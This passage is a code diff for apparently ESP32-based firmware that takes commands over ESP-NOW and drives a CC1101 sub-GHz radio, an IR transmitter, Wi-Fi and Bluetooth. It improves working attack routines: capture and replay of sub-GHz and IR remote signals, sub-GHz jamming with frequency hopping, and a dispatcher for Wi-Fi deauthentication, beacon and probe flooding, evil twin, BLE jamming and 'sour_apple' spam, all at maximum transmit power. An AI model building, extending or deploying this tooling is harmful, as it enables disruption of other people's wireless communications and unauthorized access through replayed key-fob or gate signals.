   writeReg(0x0F, freq_reg & 0xFF);
@@ -870,7 +1026,7 @@ void setCC1101_Idle() {
 }
 
 int getCC1101_RSSI() {
-  uint8_t rssi_raw = readReg(0x34);
+  uint8_t rssi_raw = readStatusReg(0x34);
   int rssi_dbm;
   if (rssi_raw >= 128) rssi_dbm = (rssi_raw - 256) / 2 - 74;
   else rssi_dbm = rssi_raw / 2 - 74;
@@ -886,13 +1042,13 @@ void cc1101Strobe(uint8_t cmd) {
 }
 
 int cc1101ReadFIFO(uint8_t* buf, int maxLen) {
-  uint8_t rxBytes = readReg(0x3B | 0xC0);
+  uint8_t rxBytes = readStatusReg(0x3B);
   if (rxBytes & 0x80) { cc1101Strobe(0x3A); return -1; }
   int toRead = min((int)rxBytes, maxLen);
   if (toRead <= 0) return 0;
   digitalWrite(CC1101_CS, LOW);
   SPI.beginTransaction(SPISettings(8000000, MSBFIRST, SPI_MODE0));
-  SPI.transfer(0xFF);
+  SPI.transfer(0xBF);
   for (int i = 0; i < toRead; i++) buf[i] = SPI.transfer(0);
   SPI.endTransaction();
   digitalWrite(CC1101_CS, HIGH);
@@ -927,39 +1083,60 @@ void startSubGhzScan() {
     sendLogToMaster("[Sub-GHz Scanner] Demo scan finished.");
     return;
   }
-  sendLogToMaster("[Sub-GHz Scanner] CC1101 detected! Scanning...");
-  float frequencies[] = {315.00, 433.92, 868.35};
-  for (int i = 0; i < 3; i++) {
+  sendLogToMaster("[Sub-GHz Scanner] CC1101 detected! Multi-band scanning...");
+  float frequencies[] = {
+    300.00, 303.87, 310.00, 315.00, 318.00,
+    390.00, 418.00, 433.07, 433.92, 434.77,
+    868.00, 868.35, 868.95, 915.00, 920.00
+  };
+  const int numFreqs = sizeof(frequencies) / sizeof(frequencies[0]);
+  int activeCount = 0;
+  for (int i = 0; i < numFreqs; i++) {
+    esp_task_wdt_reset(); yield();
+    if (!attackRunning) { sendLogToMaster("[Sub-GHz Scanner] Stopped", true); break; }
     setCC1101_Frequency(frequencies[i]);
-    delay(150);
-    int rssi = getCC1101_RSSI();
+    delay(100);
+    int rssiSum = 0;
+    for (int s = 0; s < 3; s++) {
+      rssiSum += getCC1101_RSSI();
+      delay(20);
+    }
+    int rssi = rssiSum / 3;
     char buf[80];
     const char* modType = rssi > -75 ? "ACTIVE" : (rssi > -90 ? "ASK/OOK" : "CLEAN");
-    if (rssi > -75) snprintf(buf, sizeof(buf), "[Sub-GHz] %.2f MHz: %d dBm [ACTIVE SIGNAL!]", frequencies[i], rssi);
+    if (rssi > -75) { snprintf(buf, sizeof(buf), "[Sub-GHz] %.2f MHz: %d dBm [ACTIVE SIGNAL!]", frequencies[i], rssi); activeCount++; }
     else if (rssi > -90) snprintf(buf, sizeof(buf), "[Sub-GHz] %.2f MHz: %d dBm [MODERATE]", frequencies[i], rssi);
     else snprintf(buf, sizeof(buf), "[Sub-GHz] %.2f MHz: %d dBm [CLEAN]", frequencies[i], rssi);
     sendLogToMaster(buf);
     char structBuf[80];
     snprintf(structBuf, sizeof(structBuf), "[SUBGHZ_DEV]%.2f MHz|%d dBm|%s", frequencies[i], rssi, modType);
     sendLogToMaster(structBuf);
-    delay(500);
+    delay(200);
   }
   setCC1101_Idle();
-  sendLogToMaster("[Sub-GHz Scanner] Scan finished.");
+  char sumBuf[80];
+  snprintf(sumBuf, sizeof(sumBuf), "[Sub-GHz Scanner] Scan finished. %d active signals on %d frequencies.", activeCount, numFreqs);
+  sendLogToMaster(sumBuf);
 }
 
 void startIRScan() {
-  sendLogToMaster("[IR Scanner] Point remote at receiver...");
-  pinMode(IR_RX_PIN, INPUT);
+  sendLogToMaster("[IR Scanner] Multi-protocol scan (NEC+Sony+RC5)...");
+  pinMode(IR_RX_PIN, INPUT_PULLUP);
   unsigned long startTime = millis();
   bool captured = false;
   while (millis() - startTime < 6000) {
+    esp_task_wdt_reset(); yield();
+    if (!attackRunning) { sendLogToMaster("[IR Scanner] Cancelled", true); return; }
     if (digitalRead(IR_RX_PIN) == LOW) {
       unsigned long lowPulse = pulseIn(IR_RX_PIN, LOW, 15000);
       unsigned long highPulse = pulseIn(IR_RX_PIN, HIGH, 15000);
+
+      // NEC protocol
       if (lowPulse > 8000 && lowPulse < 10000 && highPulse > 4000 && highPulse < 5000) {
         uint32_t code = 0; bool ok = true;
         for (int i = 0; i < 32; i++) {
+          esp_task_wdt_reset();
+          if (!attackRunning) { sendLogToMaster("[IR Scanner] Cancelled", true); return; }
           unsigned long bitLow = pulseIn(IR_RX_PIN, LOW, 2000);
           unsigned long bitHigh = pulseIn(IR_RX_PIN, HIGH, 2000);
           if (bitLow == 0 || bitHigh == 0) { ok = false; break; }
@@ -973,6 +1150,58 @@ void startIRScan() {
           char structBuf[80];
           snprintf(structBuf, sizeof(structBuf), "[IR_DEV]NEC|0x%04X|0x%04X|32",
                    (uint16_t)((code >> 16) & 0xFFFF), (uint16_t)(code & 0xFFFF));
+          sendLogToMaster(structBuf);
+          captured = true; break;
+        }
+      }
+      // Sony SIRC
+      else if (lowPulse > 2200 && lowPulse < 2600 && highPulse > 400 && highPulse < 800) {
+        uint32_t code = 0;
+        int bitCount = 0;
+        for (int i = 0; i < 20; i++) {
+          esp_task_wdt_reset();
+          if (!attackRunning) { sendLogToMaster("[IR Scanner] Cancelled", true); return; }
+          unsigned long bitLow = pulseIn(IR_RX_PIN, LOW, 2000);
+          unsigned long bitHigh = pulseIn(IR_RX_PIN, HIGH, 3000);
+          if (bitLow == 0) break;
+          code <<= 1;
+          if (bitLow > 1000) code |= 1;
+          bitCount++;
+          if (bitHigh == 0) break;
+        }
+        if (bitCount >= 12) {
+          char buf[64];
+          snprintf(buf, sizeof(buf), "[IR Scanner] Sony SIRC Code: 0x%05X (%d bits)", code, bitCount);
+          sendLogToMaster(buf);
+          char structBuf[80];
+          snprintf(structBuf, sizeof(structBuf), "[IR_DEV]SONY|0x%04X|0x%04X|%d",
+                   (uint16_t)((code >> 7) & 0x1FFF), (uint16_t)(code & 0x7F), bitCount);
+          sendLogToMaster(structBuf);
+          captured = true; break;
+        }
+      }
+      // RC5
+      else if (lowPulse > 700 && lowPulse < 1100 && highPulse > 700 && highPulse < 1100) {
+        uint16_t code = 0;
+        int bitCount = 0;
+        for (int i = 0; i < 14; i++) {
+          esp_task_wdt_reset();
+          if (!attackRunning) { sendLogToMaster("[IR Scanner] Cancelled", true); return; }
+          unsigned long bitLow = pulseIn(IR_RX_PIN, LOW, 2000);
+          unsigned long bitHigh = pulseIn(IR_RX_PIN, HIGH, 2000);
+          if (bitLow == 0 && bitHigh == 0) break;
+          code <<= 1;
+          if (bitHigh > bitLow) code |= 1;
+          bitCount++;
+        }
+        if (bitCount >= 13) {
+          char buf[64];
+          snprintf(buf, sizeof(buf), "[IR Scanner] RC5 Code: 0x%04X (%d bits)", code, bitCount);
+          sendLogToMaster(buf);
+          char structBuf[80];
+          uint8_t rc5Addr = (code >> 6) & 0x1F;
+          uint8_t rc5Cmd = code & 0x3F;
+          snprintf(structBuf, sizeof(structBuf), "[IR_DEV]RC5|0x%02X|0x%02X|%d", rc5Addr, rc5Cmd, bitCount);
           sendLogToMaster(structBuf);
           captured = true; break;
         }
@@ -1002,7 +1231,7 @@ void cc1101ConfigASK_OOK() {
   writeReg(0x22, 0x11); writeReg(0x23, 0xE9); writeReg(0x24, 0x2A);
   writeReg(0x25, 0x00); writeReg(0x26, 0x1F); writeReg(0x29, 0x59);
   writeReg(0x2C, 0x81); writeReg(0x2D, 0x35); writeReg(0x2E, 0x09);
-  writeReg(0x3E, 0xC0); // Max TX power
+  writeReg(0x3E, 0xC0);
 }
 
 void startSubGhzReplay() {
@@ -1024,6 +1253,7 @@ void startSubGhzReplay() {
     unsigned long listenStart = millis();
     while (millis() - listenStart < 5000) {
       esp_task_wdt_reset(); yield();
+      if (!attackRunning) { sendLogToMaster("[Sub-GHz Replay] Cancelled", true); setCC1101_Idle(); return; }
       int rssi = getCC1101_RSSI();
       if (rssi > -70) {
         snprintf(buf, sizeof(buf), "[Sub-GHz Replay] Signal! RSSI: %d @ %.2f MHz", rssi, freq);
@@ -1032,6 +1262,7 @@ void startSubGhzReplay() {
         subghzBufLen = 0;
         while (millis() - captureStart < 2000 && subghzBufLen < SUBGHZ_BUF_SIZE) {
           esp_task_wdt_reset();
+          if (!attackRunning) { sendLogToMaster("[Sub-GHz Replay] Cancelled", true); setCC1101_Idle(); return; }
           int n = cc1101ReadFIFO(subghzBuf + subghzBufLen, SUBGHZ_BUF_SIZE - subghzBufLen);
           if (n > 0) subghzBufLen += n;
           else if (n < 0) break;
@@ -1048,6 +1279,7 @@ void startSubGhzReplay() {
             }
             subghzBuf[subghzBufLen++] = byte;
             esp_task_wdt_reset();
+            if (!attackRunning) { sendLogToMaster("[Sub-GHz Replay] Cancelled", true); setCC1101_Idle(); return; }
           }
         }
         subghzCapturedFreq = freq;
@@ -1066,6 +1298,7 @@ void startSubGhzReplay() {
   sendLogToMaster(buf);
   for (int rep = 0; rep < 3; rep++) {
     esp_task_wdt_reset();
+    if (!attackRunning) { sendLogToMaster("[Sub-GHz Replay] Cancelled", true); setCC1101_Idle(); return; }
     setCC1101_Idle();
     cc1101ConfigASK_OOK();
     setCC1101_Frequency(subghzCapturedFreq);
@@ -1074,6 +1307,7 @@ void startSubGhzReplay() {
     int offset = 0;
     cc1101Strobe(0x35);
     while (offset < subghzBufLen) {
+      if (!attackRunning) { sendLogToMaster("[Sub-GHz Replay] Cancelled", true); setCC1101_Idle(); return; }
       int chunk = min(60, subghzBufLen - offset);
       cc1101WriteFIFO(subghzBuf + offset, chunk);
       offset += chunk;
@@ -1128,7 +1362,6 @@ void runSubGhzJammerStep() {
     startSubGhzJammerInit();
     if (!subghzJammerInitialized) return;
   }
-  // Frequency hopping: Normal=100ms, Boost=70ms, Extreme=30ms
   static unsigned long lastHopTime = 0;
   unsigned long hopInterval = extremeMode ? 30 : (boostMode ? 70 : 100);
   if (millis() - lastHopTime >= hopInterval) {
@@ -1179,14 +1412,15 @@ void irCarrierBurst(uint16_t us) {
 }
 
 void startIRReplay() {
-  pinMode(IR_RX_PIN, INPUT);
+  pinMode(IR_RX_PIN, INPUT_PULLUP);
   pinMode(IR_TX_PIN, OUTPUT);
   digitalWrite(IR_TX_PIN, LOW);
   irPulseCount = 0;
   sendLogToMaster("[IR Replay] Point remote at receiver...");
   unsigned long waitStart = millis();
   while (millis() - waitStart < 8000) {
-    esp_task_wdt_reset();
+    esp_task_wdt_reset(); yield();
+    if (!attackRunning) { sendLogToMaster("[IR Replay] Cancelled", true); return; }
     if (digitalRead(IR_RX_PIN) == LOW) break;
     delay(1);
   }
@@ -1195,6 +1429,8 @@ void startIRReplay() {
   }
   sendLogToMaster("[IR Replay] Signal detected, capturing...");
   while (irPulseCount < IR_BUF_MAX) {
+    esp_task_wdt_reset(); yield();
+    if (!attackRunning) { sendLogToMaster("[IR Replay] Cancelled", true); return; }
     unsigned long mark = pulseIn(IR_RX_PIN, LOW, 65000);
     if (mark == 0) break;
     irPulseBuf[irPulseCount++] = (uint16_t)min(mark, 65535UL);
@@ -1208,8 +1444,10 @@ void startIRReplay() {
   snprintf(buf, sizeof(buf), "[IR Replay] Captured %d pulses. Replaying 3x...", irPulseCount);
   sendLogToMaster(buf);
   for (int rep = 0; rep < 3; rep++) {
-    esp_task_wdt_reset();
+    esp_task_wdt_reset(); yield();
+    if (!attackRunning) { sendLogToMaster("[IR Replay] Cancelled", true); return; }
     for (int i = 0; i < irPulseCount; i++) {
+      if (!attackRunning) { sendLogToMaster("[IR Replay] Cancelled", true); return; }
       if (i % 2 == 0) irCarrierBurst(irPulseBuf[i]);
       else { digitalWrite(IR_TX_PIN, LOW); delayMicroseconds(irPulseBuf[i]); }
     }
@@ -1224,7 +1462,7 @@ void startIRReplay() {
 
 // ===== RESTORE WIFI =====
 void restoreWiFiState() {
-  WiFi.mode(WIFI_STA);
+  WiFi.mode(WIFI_AP_STA); // Restore default working mode
   WiFi.disconnect();
   WiFi.setSleep(false);
   esp_wifi_set_promiscuous(true);
@@ -1245,30 +1483,47 @@ void stopAttack() {
   isMultiAttack = false;
   multiAttackCount = 0;
   multiAttackIndex = 0;
+  
+  // Clear multi-attack list
+  for (int i = 0; i < MAX_MULTI_ATTACKS; i++) {
+    multiAttacks[i] = "";
+  }
+  
+  hasWifiTarget = false;
+  hasBleTarget = false;
+  hasSubghzTarget = false;
+  hasIrTarget = false;
   stopSubGhzJammer();
 #if HAS_DNS_SERVER
   if (dnsStarted) { dnsServer.stop(); dnsStarted = false; }
 #else
   dnsStarted = false;
 #endif
-  logQueueHead = 0; logQueueTail = 0; logQueueCount = 0; logFlushPending = false;
+
+  // Clear log queue thread-safely
+  if (logQueueMutex && xSemaphoreTake(logQueueMutex, pdMS_TO_TICKS(50)) == pdTRUE) {
+    logQueueHead = 0; logQueueTail = 0; logQueueCount = 0; logFlushPending = false;
+    for (int i = 0; i < LOG_QUEUE_SIZE; i++) logQueue[i] = "";
+    xSemaphoreGive(logQueueMutex);
+  }
+
   WiFi.softAPdisconnect(true);
   if (BLEDevice::getAdvertising()) BLEDevice::getAdvertising()->stop();
   esp_wifi_set_promiscuous(false);
   restoreWiFiState();
   digitalWrite(LED_PIN, LOW);
+  
   if (hasMasterMac) {
     struct_message response = {0};
     strlcpy(response.command, "stopped", sizeof(response.command));
-    strlcpy(response.logMsg, "All attacks stopped. Standby mode.", sizeof(response.logMsg));
-    XOR_crypt((uint8_t*)&response, sizeof(response));
+    response.logMsg[0] = '\0';
+    encrypt_aes_blocks((uint8_t*)&response, sizeof(response));
     for (int retry = 0; retry < 3; retry++) {
       esp_task_wdt_reset();
       if (esp_now_send(masterMacAddress, (uint8_t *)&response, sizeof(response)) == ESP_OK) break;
       delay(5);
     }
   }
-  Serial.println("All attacks stopped");
 }
 
 // ===== SEND PONG =====
@@ -1282,7 +1537,7 @@ void sendPong(const uint8_t *masterMac) {
   strlcpy(response.command, "pong", sizeof(response.command));
   float sTemp = getBoardTemp();
   snprintf(response.logMsg, sizeof(response.logMsg), "%.1f", sTemp);
-  XOR_crypt((uint8_t*)&response, sizeof(response));
+  encrypt_aes_blocks((uint8_t*)&response, sizeof(response));
   for (int retry = 0; retry < 3; retry++) {
     esp_task_wdt_reset();
     if (esp_now_send(masterMac, (uint8_t *)&response, sizeof(response)) == ESP_OK) break;
@@ -1301,9 +1556,17 @@ void registerMasterPeer(const uint8_t *mac) {
 
 // ===== HELPER: Parse BSSID string to bytes =====
 void parseBssid(const char* str, uint8_t* out) {
+  if (!str || strlen(str) < 17) {
+    memset(out, 0, 6);
+    return;
+  }
   unsigned int b[6] = {0};
-  sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]);
-  for (int i = 0; i < 6; i++) out[i] = (uint8_t)b[i];
+  int matched = sscanf(str, "%02X:%02X:%02X:%02X:%02X:%02X", &b[0], &b[1], &b[2], &b[3], &b[4], &b[5]);
+  if (matched != 6) {
+    memset(out, 0, 6);
+    return;
+  }
+  for (int i = 0; i < 6; i++) out[i] = (b[i] > 255) ? 0xFF : (uint8_t)b[i];
 }
 
 // ===== HELPER: Split string by delimiter =====
@@ -1332,8 +1595,19 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
 #endif
   if (len > (int)sizeof(myData)) return;
   if (len < (int)sizeof(myData)) return;
+  
+  // Validate incoming MAC address before doing anything
+  bool validMac = true;
+  if (srcMac[0] == 0xFF && srcMac[1] == 0xFF && srcMac[2] == 0xFF &&
+      srcMac[3] == 0xFF && srcMac[4] == 0xFF && srcMac[5] == 0xFF) validMac = false;
+  if (srcMac[0] == 0x00 && srcMac[1] == 0x00 && srcMac[2] == 0x00 &&
+      srcMac[3] == 0x00 && srcMac[4] == 0x00 && srcMac[5] == 0x00) validMac = false;
+  if ((srcMac[0] & 0x01) != 0) validMac = false;
+  
+  if (!validMac) return;
+
   memcpy(&myData, incomingData, sizeof(myData));
-  XOR_crypt((uint8_t*)&myData, sizeof(myData));
+  decrypt_aes_blocks((uint8_t*)&myData, sizeof(myData));
   myData.command[15] = '\0';
   myData.attack[31] = '\0';
   myData.logMsg[sizeof(myData.logMsg) - 1] = '\0';
@@ -1441,7 +1715,6 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
       isMultiAttack = true;
       attackRunning = true;
       multiAttackIndex = 0;
-      // Set mode
       boostMode = (multiAttackMode == "boost" || multiAttackMode == "extreme");
       extremeMode = (multiAttackMode == "extreme");
       char buf[80];
@@ -1459,7 +1732,6 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
     }
     attackRunning = true;
     currentAttack = String(myData.attack);
-    // Determine mode from suffix
     if (currentAttack.endsWith("_extreme")) {
       extremeMode = true; boostMode = true;
       currentAttack = currentAttack.substring(0, currentAttack.length() - 8);
@@ -1478,8 +1750,22 @@ void OnDataRecv(const uint8_t *mac_addr, const uint8_t *incomingData, int len) {
   }
 }
 
+void executeAttackStep(const String& attack);
+
 // ===== EXECUTE SINGLE ATTACK STEP =====
 void executeAttackStep(const String& attack) {
+  bool needsWiFi = (attack == "beacon" || attack == "deauth" || attack == "probe" ||
+                    attack == "powerful_jammer" || attack == "wifi_scan" || attack == "evil_twin");
+  bool needsBLE = (attack == "ble_scan" || attack == "ble_spoofer" || attack == "ble_jammer" || attack == "sour_apple");
+
+  if (needsWiFi && bleJammerInitialized && !needsBLE) {
+    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
+    if (pAdv) pAdv->stop();
+  }
+  if (needsBLE) {
+    esp_wifi_set_promiscuous(false);
+  }
+
   if (attack == "beacon") runBeaconSpamStep();
   else if (attack == "deauth") runDeauthStep();
   else if (attack == "probe") runProbeFloodStep();
@@ -1500,17 +1786,24 @@ void executeAttackStep(const String& attack) {
   else if (attack == "subghz_jammer") runSubGhzJammerStep();
   else if (attack == "ir_scan") { startIRScan(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; } }
   else if (attack == "ir_replay") { startIRReplay(); if (!isMultiAttack) { attackRunning = false; currentAttack = ""; } }
+
+  if (needsWiFi && bleJammerInitialized && !needsBLE) {
+    BLEAdvertising *pAdv = BLEDevice::getAdvertising();
+    if (pAdv) pAdv->start();
+  }
 }
 
 // ===== SETUP =====
 void setup() {
   Serial.begin(115200);
   randomSeed(esp_random());
+  logQueueMutex = xSemaphoreCreateMutex();
+
 #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
-  esp_task_wdt_config_t wdt_config = { .timeout_ms = 30000, .idle_core_mask = (1 << 0) | (1 << 1), .trigger_panic = true };
+  esp_task_wdt_config_t wdt_config = { .timeout_ms = WDT_TIMEOUT_SECONDS * 1000, .idle_core_mask = (1 << 0) | (1 << 1), .trigger_panic = true };
   esp_task_wdt_init(&wdt_config);
 #else
-  esp_task_wdt_init(30, true);
+  esp_task_wdt_init(WDT_TIMEOUT_SECONDS, true);
 #endif
   esp_task_wdt_add(NULL);
 
@@ -1521,21 +1814,16 @@ void setup() {
   WiFi.disconnect();
   WiFi.setSleep(false);
 
-  // Max TX power
   esp_wifi_set_max_tx_power(84); // +21 dBm
 
-  // Set low data rate for range (max distance)
 #if defined(ESP_ARDUINO_VERSION_MAJOR) && ESP_ARDUINO_VERSION_MAJOR >= 3
   esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_1M_L);
-#else
-  // esp_wifi_internal_set_fix_rate not available in older cores, skip
 #endif
 
   esp_wifi_set_promiscuous(true);
   esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
   esp_wifi_set_promiscuous(false);
 
-  // Initialize BLE with max power
   BLEDevice::init("ESP32-S3");
 #ifdef ESP_PWR_LVL_P21
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P21);
@@ -1547,7 +1835,6 @@ void setup() {
   esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_SCAN, ESP_PWR_LVL_P9);
 #endif
 
-  // SPI for CC1101
   SPI.begin(12, 13, 11, 10);
   if (checkCC1101()) Serial.println("CC1101 found!");
   else Serial.println("CC1101 not found.");
@@ -1578,20 +1865,17 @@ void loop() {
   updateLedIndicator();
   esp_task_wdt_reset();
 
-  // Send queued logs
   if (millis() - lastLogQueueSendTime >= LOG_QUEUE_SEND_INTERVAL) {
     lastLogQueueSendTime = millis();
     processLogQueue();
   }
 
-  // Safety timeout
   if (attackRunning && hasMasterMac && (millis() - lastMasterHeardTime > 15000)) {
     Serial.println("Master timeout. Stopping.");
     stopAttack();
   }
 
   if (attackRunning) {
-    // Listen window for Master commands
     if (millis() - lastListenTime >= 1000) {
       esp_wifi_set_promiscuous(false);
       esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
@@ -1602,10 +1886,13 @@ void loop() {
     }
 
     if (isMultiAttack) {
-      // Multi-attack round-robin
-      if (multiAttackCount > 0) {
-        executeAttackStep(multiAttacks[multiAttackIndex]);
-        multiAttackIndex = (multiAttackIndex + 1) % multiAttackCount;
+      static unsigned long lastMultiSyncTime = 0;
+      if (millis() - lastMultiSyncTime >= 10) {
+        lastMultiSyncTime = millis();
+        if (multiAttackCount > 0) {
+          executeAttackStep(multiAttacks[multiAttackIndex]);
+          multiAttackIndex = (multiAttackIndex + 1) % multiAttackCount;
+        }
       }
     } else if (currentAttack != "") {
       executeAttackStep(currentAttack);
